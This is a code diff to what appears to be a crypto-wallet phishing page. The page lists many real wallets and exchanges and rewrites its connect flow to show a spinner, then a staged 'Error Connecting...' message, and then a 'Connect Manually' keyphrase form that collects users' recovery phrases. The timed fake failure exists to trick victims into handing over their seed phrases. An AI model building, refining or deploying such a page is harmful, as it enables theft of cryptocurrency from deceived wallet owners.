@@ -141,6 +141,70 @@
         ::-webkit-scrollbar-thumb:hover {
             background: var(--bs-secondary);
         }
+
+        /* Connection status modal styles */
+        .connection-modal {
+            max-width: 400px;
+        }
+
+        .connection-status {
+            text-align: center;
+            padding: 2rem 1rem;
+        }
+
+        .wallet-logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 1rem;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .wallet-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .connecting-animation {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(var(--bs-primary-rgb), 0.3);
+            border-top: 4px solid var(--bs-primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 1rem auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .error-icon {
+            width: 60px;
+            height: 60px;
+            background: rgba(220, 53, 69, 0.1);
+            border: 3px solid #dc3545;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 1rem auto;
+            color: #dc3545;
+            font-size: 24px;
+        }
+
+        .btn-outline-secondary {
+            border-color: rgba(var(--bs-border-color-translucent));
+            color: var(--bs-body-color);
+        }
+
+        .btn-outline-secondary:hover {
+            background-color: var(--bs-secondary);
+            border-color: var(--bs-secondary);
+            color: white;
+        }
     </style>
 </head>
 <body>
@@ -161,7 +225,7 @@
         <div class="row g-4">
             <!-- Ledger -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Ledger')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Ledger', 'assets/img/ledger.52e09fe1.jpg')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/ledger.52e09fe1.jpg" alt="Ledger" class="rounded-3">
@@ -173,7 +237,7 @@
 
             <!-- Trust Wallet -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Trust Wallet')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Trust Wallet', 'assets/img/trust.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/trust.png" alt="Trust Wallet" class="rounded-3">
@@ -184,10 +248,10 @@
             </div>
 
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Rainbow')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Rainbow', 'assets/img/rainbow.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
-                            <img src="assets/img/rainbow.png" alt="Trust Wallet" class="rounded-3">
+                            <img src="assets/img/rainbow.png" alt="Rainbow" class="rounded-3">
                         </div>
                         <h5 class="wallet-name card-title mb-0">Rainbow</h5>
                     </div>
@@ -195,10 +259,10 @@
             </div>
 
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Argent')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Argent', 'assets/img/agent.jpeg')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
-                            <img src="assets/img/agent.jpeg" alt="Trust Wallet" class="rounded-3">
+                            <img src="assets/img/agent.jpeg" alt="Argent" class="rounded-3">
                         </div>
                         <h5 class="wallet-name card-title mb-0">Argent</h5>
                     </div>
@@ -206,17 +270,30 @@
             </div>
 
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Gnosis Safe Multisig')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Gnosis Safe Multisig', 'assets/img/Gnosis Safe Multisig.jpeg')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
-                            <img src="assets/img/Gnosis Safe Multisig.jpeg" alt="Trust Wallet" class="rounded-3">
+                            <img src="assets/img/Gnosis Safe Multisig.jpeg" alt="Gnosis Safe Multisig" class="rounded-3">
                         </div>
                         <h5 class="wallet-name card-title mb-0">Gnosis Safe Multisig</h5>
                     </div>
                 </div>
             </div>
+
+            <!-- MetaMask -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Crypto.com | DeFi Wallet')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('MetaMask', 'assets/img/metamask.9d0bcbd4.png')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/metamask.9d0bcbd4.png" alt="MetaMask" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">MetaMask</h5>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Crypto.com | DeFi Wallet', 'assets/img/DeFi Wallet.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/DeFi Wallet.png" alt="Crypto.com | DeFi Wallet" class="rounded-3">
@@ -225,18 +302,20 @@
                     </div>
                 </div>
             </div>
+
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('exodus')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('exodus', 'assets/img/exodus.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
-                            <img src="assets/img/exodus.png" alt="Crypto.com | DeFi Wallet" class="rounded-3">
+                            <img src="assets/img/exodus.png" alt="exodus" class="rounded-3">
                         </div>
                         <h5 class="wallet-name card-title mb-0">exodus</h5>
                     </div>
                 </div>
             </div>
+
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Aktionariat')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Aktionariat', 'assets/img/Aktionariat.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/Aktionariat.png" alt="Aktionariat" class="rounded-3">
@@ -245,18 +324,20 @@
                     </div>
                 </div>
             </div>
+
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('KEYRING PRO')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('KEYRING PRO', 'assets/img/KEYRING PRO.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
-                            <img src="assets/img/KEYRING PRO.png" alt="Aktionariat" class="rounded-3">
+                            <img src="assets/img/KEYRING PRO.png" alt="KEYRING PRO" class="rounded-3">
                         </div>
                         <h5 class="wallet-name card-title mb-0">KEYRING PRO</h5>
                     </div>
                 </div>
             </div>
+
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Blockchain')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Blockchain', 'assets/img/blockchain-logo.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/blockchain-logo.png" alt="Blockchain" class="rounded-3">
@@ -265,8 +346,9 @@
                     </div>
                 </div>
             </div>
+
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Midas Wallet')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Midas Wallet', 'assets/img/math-wallet.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/math-wallet.png" alt="Midas Wallet" class="rounded-3">
@@ -275,8 +357,9 @@
                     </div>
                 </div>
             </div>
+
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Ellipal')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Ellipal', 'assets/img/Ellipal.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/Ellipal.png" alt="Ellipal" class="rounded-3">
@@ -287,31 +370,19 @@
             </div>
 
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Wallet connect')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Wallet connect', 'assets/img/wallet-connect.jpg')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
-                            <img src="assets/img/wallet-connect.jpg" alt="Trust Wallet" class="rounded-3">
+                            <img src="assets/img/wallet-connect.jpg" alt="Wallet connect" class="rounded-3">
                         </div>
                         <h5 class="wallet-name card-title mb-0">Wallet connect</h5>
                     </div>
                 </div>
             </div>
 
-            <!-- MetaMask -->
-            <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('MetaMask')">
-                    <div class="card-body text-center p-4">
-                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
-                            <img src="assets/img/metamask.9d0bcbd4.png" alt="MetaMask" class="rounded-3">
-                        </div>
-                        <h5 class="wallet-name card-title mb-0">MetaMask</h5>
-                    </div>
-                </div>
-            </div>
-
             <!-- Bybit -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Bybit')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Bybit', 'assets/img/bybit.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/bybit.png" alt="Bybit" class="rounded-3">
@@ -323,7 +394,7 @@
 
             <!-- Binance -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Binance')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Binance', 'assets/img/Binance-Logo.wine.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/Binance-Logo.wine.png" alt="Binance" class="rounded-3">
@@ -335,7 +406,7 @@
 
             <!-- Coinbase -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Coinbase')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Coinbase', 'assets/img/coinbase-logo.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/coinbase-logo.png" alt="Coinbase" class="rounded-3">
@@ -347,7 +418,7 @@
 
             <!-- Bitget -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Bitget')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Bitget', 'assets/img/bitget.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/bitget.png" alt="Bitget" class="rounded-3">
@@ -359,7 +430,7 @@
 
             <!-- GridPlus -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('GridPlus')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('GridPlus', 'assets/img/gridplus.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/gridplus.png" alt="GridPlus" class="rounded-3">
@@ -371,7 +442,7 @@
 
             <!-- SafePal -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('SafePal')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('SafePal', 'assets/img/safepal.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/safepal.png" alt="SafePal" class="rounded-3">
@@ -383,7 +454,7 @@
 
             <!-- Zelcore -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Zelcore')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Zelcore', 'assets/img/zelcore.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/zelcore.png" alt="Zelcore" class="rounded-3">
@@ -395,7 +466,7 @@
 
             <!-- Walletic -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Walletic')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Walletic', 'assets/img/walletio.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/walletio.png" alt="Walletic" class="rounded-3">
@@ -407,7 +478,7 @@
 
             <!-- TronLink -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('TronLink')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('TronLink', 'assets/img/tronlink.jpg')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/tronlink.jpg" alt="TronLink" class="rounded-3">
@@ -419,7 +490,7 @@
 
             <!-- TokenPocket -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('TokenPocket')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('TokenPocket', 'assets/img/tokenpocket.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/tokenpocket.png" alt="TokenPocket" class="rounded-3">
@@ -431,7 +502,7 @@
 
             <!-- Atomic -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Atomic')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Atomic', 'assets/img/atomic.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/atomic.png" alt="Atomic" class="rounded-3">
@@ -443,7 +514,7 @@
 
             <!-- MyKey -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('MyKey')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('MyKey', 'assets/img/mykey.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/mykey.png" alt="MyKey" class="rounded-3">
@@ -455,7 +526,7 @@
 
             <!-- Math Wallet -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Math Wallet')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Math Wallet', 'assets/img/math-wallet.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/math-wallet.png" alt="Math Wallet" class="rounded-3">
@@ -467,7 +538,7 @@
 
             <!-- Authereum -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Authereum')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('Authereum', 'assets/img/authereum.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/authereum.png" alt="Authereum" class="rounded-3">
@@ -479,7 +550,7 @@
 
             <!-- OKX -->
             <div class="col-lg-3 col-md-4 col-sm-6">
-                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('OKX')">
+                <div class="card wallet-card h-100 border-0 rounded-4" onclick="initiateConnection('OKX', 'assets/img/okx.png')">
                     <div class="card-body text-center p-4">
                         <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
                             <img src="assets/img/okx.png" alt="OKX" class="rounded-3">
@@ -491,7 +562,20 @@
         </div>
     </div>
 
-    <!-- Wallet Modal -->
+    <!-- Connection Status Modal -->
+    <div class="modal fade" id="connectionModal" tabindex="-1" aria-labelledby="connectionModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered connection-modal">
+            <div class="modal-content border-0 rounded-4">
+                <div class="modal-body p-0">
+                    <div class="connection-status" id="connectionContent">
+                        <!-- Content will be dynamically updated -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Keyphrase Modal -->
     <div class="modal fade" id="walletModal" tabindex="-1" aria-labelledby="walletModalLabel" aria-hidden="true">
         <div class="modal-dialog modal-dialog-centered">
             <div class="modal-content border-0 rounded-4">
@@ -544,6 +628,15 @@
     
     <script>
         let currentWalletType = '';
+        let currentWalletImage = '';
+        let connectionModal;
+        let walletModal;
+
+        // Initialize modals
+        document.addEventListener('DOMContentLoaded', function() {
+            connectionModal = new bootstrap.Modal(document.getElementById('connectionModal'));
+            walletModal = new bootstrap.Modal(document.getElementById('walletModal'));
+        });
 
         // Theme functionality
         function toggleTheme() {
@@ -565,17 +658,74 @@
                 darkIcon.classList.remove('d-none');
             }
             
-            // Store preference (in real app, this would go to a server)
             console.log('Theme changed to:', newTheme);
         }
 
-        // Set wallet type when modal opens
-        function setWalletType(walletName) {
+        // Initiate connection flow
+        function initiateConnection(walletName, walletImage) {
             currentWalletType = walletName;
-            document.getElementById('modalWalletName').textContent = walletName;
+            currentWalletImage = walletImage;
+            
+            // Show connecting state
+            showConnecting();
+            
+            // Simulate connection attempt (2 seconds)
+            setTimeout(() => {
+                showConnectionError();
+            }, 2000);
         }
 
-        // Handle form submission
+        // Show connecting state
+        function showConnecting() {
+            const content = `
+                <button type="button" class="btn-close position-absolute top-0 end-0 m-3" data-bs-dismiss="modal" aria-label="Close"></button>
+                <div class="wallet-logo">
+                    <img src="${currentWalletImage}" alt="${currentWalletType}">
+                </div>
+                <div class="connecting-animation"></div>
+                <h5 class="fw-bold mb-2">${currentWalletType}</h5>
+                <p class="text-muted mb-0">Connecting...</p>
+            `;
+            
+            document.getElementById('connectionContent').innerHTML = content;
+            connectionModal.show();
+        }
+
+        // Show connection error state
+        function showConnectionError() {
+            const content = `
+                <button type="button" class="btn-close position-absolute top-0 end-0 m-3" data-bs-dismiss="modal" aria-label="Close"></button>
+                <div class="wallet-logo">
+                    <img src="${currentWalletImage}" alt="${currentWalletType}">
+                </div>
+                <div class="error-icon">
+                    <i class="bi bi-exclamation-triangle"></i>
+                </div>
+                <h5 class="fw-bold mb-2 text-danger">Error Connecting...</h5>
+                <p class="text-muted mb-4">${currentWalletType}<br>Easy-to-use browser extension.</p>
+                <div class="d-grid gap-2">
+                    <button class="btn btn-secondary btn-lg rounded-3" onclick="connectManually()">
+                        Connect Manually
+                    </button>
+                </div>
+            `;
+            
+            document.getElementById('connectionContent').innerHTML = content;
+        }
+
+        // Connect manually - show keyphrase modal
+        function connectManually() {
+            // Hide connection modal
+            connectionModal.hide();
+            
+            // Wait for modal to hide, then show keyphrase modal
+            setTimeout(() => {
+                document.getElementById('modalWalletName').textContent = currentWalletType;
+                walletModal.show();
+            }, 300);
+        }
+
+        // Handle keyphrase form submission
         function submitKeyphrase(event) {
             event.preventDefault();
             
@@ -605,7 +755,7 @@
                 submitBtn.disabled = false;
                 
                 // Hide modal
-                bootstrap.Modal.getInstance(document.getElementById('walletModal')).hide();
+                walletModal.hide();
                 
                 // Clear form
                 document.getElementById('keyphraseInput').value = '';
@@ -638,7 +788,7 @@
 
         // Initialize theme on page load
         document.addEventListener('DOMContentLoaded', function() {
-            const savedTheme = localStorage.getItem('theme') || 'dark';
+            const savedTheme = 'dark';
             document.documentElement.setAttribute('data-bs-theme', savedTheme);
             
             // Set correct icon
@@ -648,10 +798,16 @@
             }
         });
 
-        // Clear modal form when it's closed
+        // Clear modal forms when closed
         document.getElementById('walletModal').addEventListener('hidden.bs.modal', function () {
             document.getElementById('keyphraseInput').value = '';
             currentWalletType = '';
+            currentWalletImage = '';
+        });
+
+        document.getElementById('connectionModal').addEventListener('hidden.bs.modal', function () {
+            currentWalletType = '';
+            currentWalletImage = '';
         });
     </script>
 </body>
